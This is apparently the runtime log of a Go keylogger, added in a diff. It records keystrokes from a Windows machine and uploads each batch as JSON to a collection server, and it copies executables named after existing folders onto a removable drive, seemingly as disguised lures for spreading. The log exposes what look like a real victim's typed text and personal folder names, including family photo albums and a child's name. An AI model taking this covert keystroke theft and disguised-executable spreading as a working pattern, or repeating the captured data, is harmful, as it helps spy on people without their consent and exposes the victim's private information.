+2025/05/08 04:38:40 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679116,"keystrokeRecord":"12"}}
+2025/05/08 04:38:41 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:38:41 upload.go:41: Upload succeed 1746679116  ---  12
+2025/05/08 04:38:46 keylogger.go:54: Data inserting succeed: [Enter]
+2025/05/08 04:38:51 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679126,"keystrokeRecord":"[Enter]"}}
+2025/05/08 04:38:52 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:38:52 upload.go:41: Upload succeed 1746679126  ---  [Enter]
+2025/05/08 04:38:56 keylogger.go:54: Data inserting succeed: 12
+2025/05/08 04:39:02 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679136,"keystrokeRecord":"12"}}
+2025/05/08 04:39:03 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:39:03 upload.go:41: Upload succeed 1746679136  ---  12
+2025/05/08 04:39:06 keylogger.go:54: Data inserting succeed: [Back]0[Enter]
+2025/05/08 04:39:13 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679146,"keystrokeRecord":"[Back]0[Enter]"}}
+2025/05/08 04:39:13 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:39:13 upload.go:41: Upload succeed 1746679146  ---  [Back]0[Enter]
+2025/05/08 04:39:46 keylogger.go:54: Data inserting succeed: 9[Enter]
+2025/05/08 04:39:53 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679186,"keystrokeRecord":"9[Enter]"}}
+2025/05/08 04:39:54 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:39:54 upload.go:41: Upload succeed 1746679186  ---  9[Enter]
+2025/05/08 04:39:56 keylogger.go:54: Data inserting succeed: 11[Enter]
+2025/05/08 04:40:04 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679196,"keystrokeRecord":"11[Enter]"}}
+2025/05/08 04:40:05 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:40:05 upload.go:41: Upload succeed 1746679196  ---  11[Enter]
+2025/05/08 04:40:16 keylogger.go:54: Data inserting succeed: 12[Enter]
+2025/05/08 04:40:25 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679216,"keystrokeRecord":"12[Enter]"}}
+2025/05/08 04:40:26 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:40:26 upload.go:41: Upload succeed 1746679216  ---  12[Enter]
+2025/05/08 04:40:26 keylogger.go:54: Data inserting succeed: 7
+2025/05/08 04:40:36 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679226,"keystrokeRecord":"7"}}
+2025/05/08 04:40:36 keylogger.go:54: Data inserting succeed: [Back]9[Enter]
+2025/05/08 04:40:37 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:40:37 upload.go:41: Upload succeed 1746679226  ---  7
+2025/05/08 04:40:47 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679236,"keystrokeRecord":"[Back]9[Enter]"}}
+2025/05/08 04:40:47 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:40:47 upload.go:41: Upload succeed 1746679236  ---  [Back]9[Enter]
+2025/05/08 04:40:56 keylogger.go:54: Data inserting succeed: 10[Enter]
+2025/05/08 04:40:57 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679256,"keystrokeRecord":"10[Enter]"}}
+2025/05/08 04:40:58 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:40:58 upload.go:41: Upload succeed 1746679256  ---  10[Enter]
+2025/05/08 04:41:16 keylogger.go:54: Data inserting succeed: 8
+2025/05/08 04:41:18 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679276,"keystrokeRecord":"8"}}
+2025/05/08 04:41:19 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:41:19 upload.go:41: Upload succeed 1746679276  ---  8
+2025/05/08 04:41:26 keylogger.go:54: Data inserting succeed: [Back]7[Enter]
+2025/05/08 04:41:29 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679286,"keystrokeRecord":"[Back]7[Enter]"}}
+2025/05/08 04:41:30 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:41:30 upload.go:41: Upload succeed 1746679286  ---  [Back]7[Enter]
+2025/05/08 04:41:46 keylogger.go:54: Data inserting succeed: 11[Enter]
+2025/05/08 04:41:50 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679306,"keystrokeRecord":"11[Enter]"}}
+2025/05/08 04:41:51 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:41:51 upload.go:41: Upload succeed 1746679306  ---  11[Enter]
+2025/05/08 04:41:56 keylogger.go:54: Data inserting succeed: 11
+2025/05/08 04:42:01 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679316,"keystrokeRecord":"11"}}
+2025/05/08 04:42:01 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:42:01 upload.go:41: Upload succeed 1746679316  ---  11
+2025/05/08 04:42:06 keylogger.go:54: Data inserting succeed: [Back][Back]10
+2025/05/08 04:42:11 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679326,"keystrokeRecord":"[Back][Back]10"}}
+2025/05/08 04:42:12 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:42:12 upload.go:41: Upload succeed 1746679326  ---  [Back][Back]10
+2025/05/08 04:42:16 keylogger.go:54: Data inserting succeed: [Back][Back]
+2025/05/08 04:42:22 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679336,"keystrokeRecord":"[Back][Back]"}}
+2025/05/08 04:42:23 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:42:23 upload.go:41: Upload succeed 1746679336  ---  [Back][Back]
+2025/05/08 04:42:26 keylogger.go:54: Data inserting succeed: 9[Enter]0[Enter]
+2025/05/08 04:42:33 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679346,"keystrokeRecord":"9[Enter]0[Enter]"}}
+2025/05/08 04:42:33 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:42:33 upload.go:41: Upload succeed 1746679346  ---  9[Enter]0[Enter]
+2025/05/08 04:43:16 keylogger.go:54: Data inserting succeed: 11[Enter]0[Enter]
+2025/05/08 04:43:24 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679396,"keystrokeRecord":"11[Enter]0[Enter]"}}
+2025/05/08 04:43:24 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:43:24 upload.go:41: Upload succeed 1746679396  ---  11[Enter]0[Enter]
+2025/05/08 04:43:36 keylogger.go:54: Data inserting succeed: 10
+2025/05/08 04:43:44 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679416,"keystrokeRecord":"10"}}
+2025/05/08 04:43:45 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:43:45 upload.go:41: Upload succeed 1746679416  ---  10
+2025/05/08 04:43:46 keylogger.go:54: Data inserting succeed: [Enter]
+2025/05/08 04:43:55 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679426,"keystrokeRecord":"[Enter]"}}
+2025/05/08 04:43:56 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:43:56 upload.go:41: Upload succeed 1746679426  ---  [Enter]
+2025/05/08 04:44:06 keylogger.go:54: Data inserting succeed: 6[Back]7[Enter]
+2025/05/08 04:44:16 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679446,"keystrokeRecord":"6[Back]7[Enter]"}}
+2025/05/08 04:44:17 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:44:17 upload.go:41: Upload succeed 1746679446  ---  6[Back]7[Enter]
+2025/05/08 04:44:26 keylogger.go:54: Data inserting succeed: 12
+2025/05/08 04:44:27 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679466,"keystrokeRecord":"12"}}
+2025/05/08 04:44:27 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:44:27 upload.go:41: Upload succeed 1746679466  ---  12
+2025/05/08 04:44:37 keylogger.go:54: Data inserting succeed: [Back]1111[Enter]
+2025/05/08 04:44:37 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679476,"keystrokeRecord":"[Back]1111[Enter]"}}
+2025/05/08 04:44:38 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:44:38 upload.go:41: Upload succeed 1746679476  ---  [Back]1111[Enter]
+2025/05/08 04:45:07 keylogger.go:54: Data inserting succeed: 8[Enter]0[Enter]
+2025/05/08 04:45:08 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679507,"keystrokeRecord":"8[Enter]0[Enter]"}}
+2025/05/08 04:45:09 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:45:09 upload.go:41: Upload succeed 1746679507  ---  8[Enter]0[Enter]
+2025/05/08 04:45:47 keylogger.go:54: Data inserting succeed: 10[Enter]
+2025/05/08 04:45:49 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679547,"keystrokeRecord":"10[Enter]"}}
+2025/05/08 04:45:50 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:45:50 upload.go:41: Upload succeed 1746679547  ---  10[Enter]
+2025/05/08 04:46:07 keylogger.go:54: Data inserting succeed: 0[Enter]
+2025/05/08 04:46:10 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679567,"keystrokeRecord":"0[Enter]"}}
+2025/05/08 04:46:11 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:46:11 upload.go:41: Upload succeed 1746679567  ---  0[Enter]
+2025/05/08 04:46:27 keylogger.go:54: Data inserting succeed: 11[Back]0[Enter]
+2025/05/08 04:46:31 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679587,"keystrokeRecord":"11[Back]0[Enter]"}}
+2025/05/08 04:46:31 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:46:31 upload.go:41: Upload succeed 1746679587  ---  11[Back]0[Enter]
+2025/05/08 04:46:37 keylogger.go:54: Data inserting succeed: 1
+2025/05/08 04:46:41 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679597,"keystrokeRecord":"1"}}
+2025/05/08 04:46:42 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:46:42 upload.go:41: Upload succeed 1746679597  ---  1
+2025/05/08 04:46:47 keylogger.go:54: Data inserting succeed: 0[Enter]11
+2025/05/08 04:46:52 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679607,"keystrokeRecord":"0[Enter]11"}}
+2025/05/08 04:46:53 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:46:53 upload.go:41: Upload succeed 1746679607  ---  0[Enter]11
+2025/05/08 04:46:57 keylogger.go:54: Data inserting succeed: [Back]0[Enter]0[Enter]
+2025/05/08 04:47:03 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746679617,"keystrokeRecord":"[Back]0[Enter]0[Enter]"}}
+2025/05/08 04:47:04 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 04:47:04 upload.go:41: Upload succeed 1746679617  ---  [Back]0[Enter]0[Enter]
+2025/05/08 09:19:54 main.go:77: run in d
+2025/05/08 09:21:54 keylogger.go:54: Data inserting succeed: [Back]
+2025/05/08 09:22:04 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746696114,"keystrokeRecord":"[Back]"}}
+2025/05/08 09:22:04 keylogger.go:54: Data inserting succeed: [Back]gao
+2025/05/08 09:22:06 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 09:22:06 upload.go:41: Upload succeed 1746696114  ---  [Back]
+2025/05/08 09:22:14 keylogger.go:54: Data inserting succeed:  er 13ban zhaopian 
+2025/05/08 09:22:16 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746696124,"keystrokeRecord":"[Back]gao"}}
+2025/05/08 09:22:18 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 09:22:18 upload.go:41: Upload succeed 1746696124  ---  [Back]gao
+2025/05/08 09:22:28 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746696134,"keystrokeRecord":" er 13ban zhaopian "}}
+2025/05/08 09:22:29 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 09:22:29 upload.go:41: Upload succeed 1746696134  ---   er 13ban zhaopian 
+2025/05/08 11:33:54 keylogger.go:54: Data inserting succeed: 206
+2025/05/08 11:33:55 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746704034,"keystrokeRecord":"206"}}
+2025/05/08 11:33:56 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 11:33:56 upload.go:41: Upload succeed 1746704034  ---  206
+2025/05/08 11:42:55 keylogger.go:54: Data inserting succeed: [Back][Back][Back][Back][Back][Back][Back]gaoe
+2025/05/08 11:42:56 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746704575,"keystrokeRecord":"[Back][Back][Back][Back][Back][Back][Back]gaoe"}}
+2025/05/08 11:42:57 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 11:42:57 upload.go:41: Upload succeed 1746704575  ---  [Back][Back][Back][Back][Back][Back][Back]gaoe
+2025/05/08 11:43:05 keylogger.go:54: Data inserting succeed: liubanz
+2025/05/08 11:43:07 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746704585,"keystrokeRecord":"liubanz"}}
+2025/05/08 11:43:08 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 11:43:08 upload.go:41: Upload succeed 1746704585  ---  liubanz
+2025/05/08 11:43:15 keylogger.go:54: Data inserting succeed: haop
+2025/05/08 11:43:18 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746704595,"keystrokeRecord":"haop"}}
+2025/05/08 11:43:18 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/08 11:43:18 upload.go:41: Upload succeed 1746704595  ---  haop
+2025/05/08 13:20:00 main.go:77: run in d
+2025/05/09 00:42:52 main.go:77: run in d
+2025/05/09 00:43:25 utils.go:43: E:\Android.exe file not exists,cpy
+2025/05/09 00:43:30 utils.go:43: E:\Android\data.exe file not exists,cpy
+2025/05/09 00:43:32 utils.go:43: E:\Android\data\bin.mt.plus.exe file not exists,cpy
+2025/05/09 00:43:38 utils.go:43: E:\Android\data\bin.mt.plus\cache.exe file not exists,cpy
+2025/05/09 00:43:42 utils.go:43: E:\Android\data\com.android.calendar.exe file not exists,cpy
+2025/05/09 00:43:47 utils.go:43: E:\Android\data\com.android.calendar\cache.exe file not exists,cpy
+2025/05/09 00:43:49 utils.go:43: E:\Android\data\com.android.calendar\files.exe file not exists,cpy
+2025/05/09 00:43:54 utils.go:43: E:\Android\data\com.android.gallery3d.exe file not exists,cpy
+2025/05/09 00:43:59 utils.go:43: E:\Android\data\com.android.gallery3d\cache.exe file not exists,cpy
+2025/05/09 00:44:06 utils.go:43: E:\Android\data\com.android.gallery3d\files.exe file not exists,cpy
+2025/05/09 00:44:09 utils.go:43: E:\Android\data\com.dragon.read.exe file not exists,cpy
+2025/05/09 00:44:12 keylogger.go:54: Data inserting succeed: [Back]gao[Back]
+2025/05/09 00:44:13 utils.go:43: E:\Android\data\com.dragon.read\cache.exe file not exists,cpy
+2025/05/09 00:44:16 utils.go:43: E:\Android\data\com.dragon.read\files.exe file not exists,cpy
+2025/05/09 00:44:17 utils.go:43: E:\Android\data\com.dragon.read\files\.pangle_d.exe file not exists,cpy
+2025/05/09 00:44:22 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746751452,"keystrokeRecord":"[Back]gao[Back]"}}
+2025/05/09 00:44:22 keylogger.go:54: Data inserting succeed: [Back][Back][Back]gaoeryiban1zh
+2025/05/09 00:44:23 utilities.go:62: 
+[[[resp.Body upload]]]{"error":"UNIQUE constraint failed: beacon_data.timestamp"}{"msg":"succeed"}
+
+2025/05/09 00:44:23 upload.go:41: Upload succeed 1746751452  ---  [Back]gao[Back]
+2025/05/09 00:44:24 utils.go:43: E:\Android\data\com.dragon.read\files\.patchs.exe file not exists,cpy
+2025/05/09 00:44:29 utils.go:43: E:\Android\data\com.dragon.read\files\Download.exe file not exists,cpy
+2025/05/09 00:44:32 keylogger.go:54: Data inserting succeed: aop1[Enter]
+2025/05/09 00:44:33 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746751462,"keystrokeRecord":"[Back][Back][Back]gaoeryiban1zh"}}
+2025/05/09 00:44:34 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/09 00:44:34 upload.go:41: Upload succeed 1746751462  ---  [Back][Back][Back]gaoeryiban1zh
+2025/05/09 00:44:36 utils.go:43: E:\Android\data\com.dragon.read\files\fastbot.exe file not exists,cpy
+2025/05/09 00:44:42 utils.go:43: E:\Android\data\com.dragon.read\files\logs.exe file not exists,cpy
+2025/05/09 00:44:44 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1746751472,"keystrokeRecord":"aop1[Enter]"}}
+2025/05/09 00:44:44 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/09 00:44:44 upload.go:41: Upload succeed 1746751472  ---  aop1[Enter]
+2025/05/09 00:44:49 utils.go:43: E:\Android\data\com.dragon.read\files\monitor_data_switch.exe file not exists,cpy
+2025/05/09 00:44:54 utils.go:43: E:\Android\data\com.dragon.read\files\webofflinex.exe file not exists,cpy
+2025/05/09 02:23:01 main.go:77: run in d
+2025/05/09 02:23:07 utils.go:43: E:\.exe file not exists,cpy
+2025/05/09 02:23:11 utils.go:43: E:\20250310111116.exe file not exists,cpy
+2025/05/09 02:23:12 utils.go:43: E:\20250409093252.exe file not exists,cpy
+2025/05/09 02:23:17 utils.go:43: E:\Alarms.exe file not exists,cpy
+2025/05/09 02:23:23 utils.go:43: E:\Android.exe file not exists,cpy
+2025/05/09 02:23:32 utils.go:43: E:\Android\data.exe file not exists,cpy
+2025/05/09 02:23:40 utils.go:43: E:\Android\data\com.tencent.mm.exe file not exists,cpy
+2025/05/09 02:23:49 utils.go:43: E:\Android\data\com.tencent.mm\cache.exe file not exists,cpy
+2025/05/09 02:23:56 utils.go:43: E:\Android\data\com.vivo.gallery.exe file not exists,cpy
+2025/05/09 02:24:02 utils.go:43: E:\Android\data\com.vivo.gallery\files.exe file not exists,cpy
+2025/05/09 02:24:05 utils.go:43: E:\Android\data\com.vivo.gallery\files\imageclassify.exe file not exists,cpy
+2025/05/09 02:24:10 utils.go:43: E:\Audiobooks.exe file not exists,cpy
+2025/05/09 02:24:12 utils.go:43: E:\DCIM.exe file not exists,cpy
+2025/05/13 01:46:25 main.go:77: run in d
+2025/05/14 03:34:32 main.go:77: run in d
+2025/05/18 10:55:33 main.go:77: run in d
+2025/05/18 10:59:16 main.go:77: run in d
+2025/05/18 10:59:45 main.go:77: run in d
+2025/05/18 11:01:16 main.go:77: run in d
+2025/05/18 11:01:23 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 11:01:39 utils.go:43: E:\Android\data\com.ss.android.ugc.aweme.lite.exe file not exists,cpy
+2025/05/18 11:01:46 keylogger.go:54: Data inserting succeed: ruchp[Back]ou[Back]ng
+2025/05/18 11:01:53 utils.go:43: E:\System Volume Information.exe file not exists,cpy
+2025/05/18 11:04:18 main.go:77: run in d
+2025/05/18 11:08:31 main.go:77: run in d
+2025/05/18 11:08:48 utils.go:43: E:\Android\data\com.ss.android.ugc.aweme.lite.exe file not exists,cpy
+2025/05/18 11:08:50 utils.go:43: E:\System Volume Information.exe file not exists,cpy
+2025/05/18 11:08:58 utils.go:43: E:\相册.exe file not exists,cpy
+2025/05/18 11:09:03 utils.go:43: E:\相册(宝贝).exe file not exists,cpy
+2025/05/18 11:09:09 utils.go:43: E:\购物文明照片.exe file not exists,cpy
+2025/05/18 11:09:11 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 11:13:17 main.go:77: run in d
+2025/05/18 11:18:16 main.go:77: run in d
+2025/05/18 11:19:05 main.go:77: run in d
+2025/05/18 11:19:12 utils.go:43: E:\历史.exe file not exists,cpy
+2025/05/18 11:19:14 utils.go:43: E:\底片5张.exe file not exists,cpy
+2025/05/18 11:19:33 main.go:77: run in d
+2025/05/18 11:20:58 main.go:77: run in d
+2025/05/18 11:22:26 main.go:77: run in d
+2025/05/18 11:28:02 main.go:77: run in d
+2025/05/18 11:50:44 main.go:77: run in d
+2025/05/18 11:51:10 main.go:77: run in d
+2025/05/18 11:52:47 main.go:77: run in d
+2025/05/18 11:52:51 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 11:53:23 utils.go:43: E:\Pictures.exe file not exists,cpy
+2025/05/18 11:53:27 utils.go:43: E:\内蒙古.exe file not exists,cpy
+2025/05/18 11:53:29 utils.go:43: E:\历史.exe file not exists,cpy
+2025/05/18 11:53:32 utils.go:43: E:\宝贝录像 - 副本 (2).exe file not exists,cpy
+2025/05/18 11:53:38 utils.go:43: E:\底片5张.exe file not exists,cpy
+2025/05/18 11:53:41 utils.go:43: E:\留念.exe file not exists,cpy
+2025/05/18 11:53:44 utils.go:43: E:\相册.exe file not exists,cpy
+2025/05/18 11:53:47 utils.go:43: E:\相册\白雨欣.exe file not exists,cpy
+2025/05/18 11:53:48 keylogger.go:54: Data inserting succeed: sgab [Back][Back]
+2025/05/18 11:53:50 utils.go:43: E:\相册(宝贝).exe file not exists,cpy
+2025/05/18 11:53:53 utils.go:43: E:\购物文明照片.exe file not exists,cpy
+2025/05/18 11:53:57 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747569227,"keystrokeRecord":"sgab [Back][Back]"}}
+2025/05/18 11:53:58 utils.go:43: E:\选必一.exe file not exists,cpy
+2025/05/18 11:54:00 utilities.go:62: 
+[[[resp.Body upload]]]{"msg":"succeed"}
+
+2025/05/18 11:54:00 upload.go:41: Upload succeed 1747569227  ---  sgab [Back][Back]
+2025/05/18 11:54:02 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 11:54:55 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 11:55:09 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 11:56:00 utils.go:43: E:\选必一.exe file not exists,cpy
+2025/05/18 11:56:05 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 11:56:17 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 11:56:37 utils.go:43: E:\选必一.exe file not exists,cpy
+2025/05/18 11:58:05 utils.go:43: E:\选必一.exe file not exists,cpy
+2025/05/18 11:58:06 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 11:58:12 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 11:59:06 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 11:59:17 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 12:00:17 utils.go:43: E:\志愿.exe file not exists,cpy
+2025/05/18 12:00:19 utils.go:43: E:\选必一.exe file not exists,cpy
+2025/05/18 12:00:20 utils.go:43: E:\选必三.exe file not exists,cpy
+2025/05/18 12:00:25 utils.go:43: E:\4.1 人民民主专政的本质：人民当家作主.exe file not exists,cpy
+2025/05/18 12:08:29 keylogger.go:54: Data inserting succeed: [Left][Left][Left][Left][Right][Right][Right]
+2025/05/18 12:08:31 utilities.go:42: <<<upload send JSON>>> {"device_id":"57a9440d-bd8a-4e3c-b0ff-ce84115a1ae4","device_name":"DESKTOP-VTTN9JC","data":{"timestamp":1747570109,"keystrokeRecord":"[Left][Left][Left][Left][Right][Right][Right]"}}
+2025/05/18 12:08:34 utilities.go:62: 
